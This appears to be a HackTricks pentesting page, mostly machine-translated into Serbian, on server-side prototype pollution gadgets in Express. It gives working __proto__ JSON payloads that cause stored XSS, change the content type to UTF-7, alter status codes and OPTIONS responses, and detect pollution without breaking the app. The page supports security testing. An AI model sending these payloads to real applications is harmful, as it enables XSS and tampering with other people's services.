# Express Prototype Pollution Gadgets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je **dark-web** pretra≈æivaƒç koji nudi **besplatne** funkcionalnosti za proveru da li je neka kompanija ili njeni klijenti bili **kompromitovani** od strane **malvera za kraƒëu podataka**.

Njihov primarni cilj je da se bore protiv preuzimanja naloga i ransomware napada koji proizlaze iz malvera za kraƒëu informacija.

Mo≈æete proveriti njihovu veb stranicu i isprobati njihov pretra≈æivaƒç **besplatno** na:

{% embed url="https://whiteintel.io" %}

***

## Serve XSS responses

**Za vi≈°e detalja** [**pogledajte originalno istra≈æivanje**](https://portswigger.net/research/server-side-prototype-pollution)

### Change JSON content-type to HTML

U Express aplikaciji koja koristi **JSON content type response** i reflektuje JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
U ovim sluƒçajevima XSS obiƒçno nije moguƒá sa JSON tipom sadr≈æaja. Meƒëutim, sa zagaƒëenjem prototipa mo≈æemo **zbuniti Express da vrati HTML odgovor.** Ova ranjivost se oslanja na aplikaciju koja koristi **`res.send(obj)`** i koristi parser tela sa tipom sadr≈æaja application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
By **polluting** **`body`** and **`_body`** properties, it's possible to cause **Express to serve up the HTML content type** and reflect the `_body` property, resulting in stored XSS.

### Render UTF7

Moguƒáe je naterati express da **prikazuje UTF-7 sadr≈æaj sa**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Tehnike bezbednog skeniranja

### JSON razmaci

Sledeƒái PP ƒáe dodati dodatni razmak unutar atributa u JSON-u, ≈°to neƒáe pokvariti funkcionalnost:
```json
{"__proto__":{"json spaces": " "}}
```
–¢–∞–¥–∞ —õ–µ —Ä–µ—Ñ–ª–µ–∫—Ç–æ–≤–∞–Ω–∏ JSON –∏–∑–≥–ª–µ–¥–∞—Ç–∏ –æ–≤–∞–∫–æ:
```json
{"foo":  "bar"} -- Note the extra space
```
### Izlo≈æeni Headeri

The following PP gadget will make the server send back the HTTP header: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Zahteva se **CORS modul da bude instaliran**

### **OPTIONS Metoda**

Sa sledeƒáim payload-om, moguƒáe je **sakriti metodu iz OPTIONS odgovora**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

Moguƒáe je promeniti **vratni status kod** koristeƒái sledeƒái PP payload:
```json
{"__proto__":{"status":510}}
```
### Gre≈°ka

Kada dodelite prototipu primitiv kao ≈°to je string, to proizvodi **no-op operaciju jer prototip mora biti objekat**. Ako poku≈°ate da dodelite objekat prototipa samom `Object.prototype`, to ƒáe **izazvati izuzetak**. Mo≈æemo koristiti ova dva pona≈°anja da **otkrijemo da li je zagaƒëenje prototipa bilo uspe≈°no**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Reflected Value

Kada aplikacija ukljuƒçuje objekat u svoj odgovor, kreiranje atributa sa **neobiƒçnim imenom pored `__proto__`** mo≈æe biti korisno. Konkretno, ako **samo neobiƒçni atribut bude vraƒáen** u odgovoru, to mo≈æe ukazivati na ranjivost aplikacije:
```json
{"unusualName":"value","__proto__":"test"}
```
Pored toga, u scenarijima gde se koristi biblioteka kao ≈°to je Lodash, postavljanje svojstva kako putem zagaƒëenja prototipa (PP) tako i direktno unutar objekta nudi jo≈° jedan dijagnostiƒçki pristup. Ako je takvo svojstvo izostavljeno iz odgovora, to sugeri≈°e da Lodash proverava postojanje svojstva u ciljanom objektu pre nego ≈°to ga spoji:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Dozvolite taƒçke

Postoji opcija u Express-u koja vam omoguƒáava da **kreirate objekte iz parametara upita**.\
Definitivno biste mogli da je koristite u **lancu** gre≈°aka za iskori≈°ƒáavanje **ranjivosti zagaƒëenja prototipa**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` kreira objekat u Node.**

## Reference

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je **dark-web** pretra≈æivaƒç koji nudi **besplatne** funkcionalnosti za proveru da li je neka kompanija ili njeni klijenti bili **kompromitovani** od strane **stealer malvera**.

Njihov primarni cilj WhiteIntel-a je da se bori protiv preuzimanja naloga i ransomware napada koji proizlaze iz malvera koji krade informacije.

Mo≈æete proveriti njihovu veb stranicu i isprobati njihov pretra≈æivaƒç **besplatno** na:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
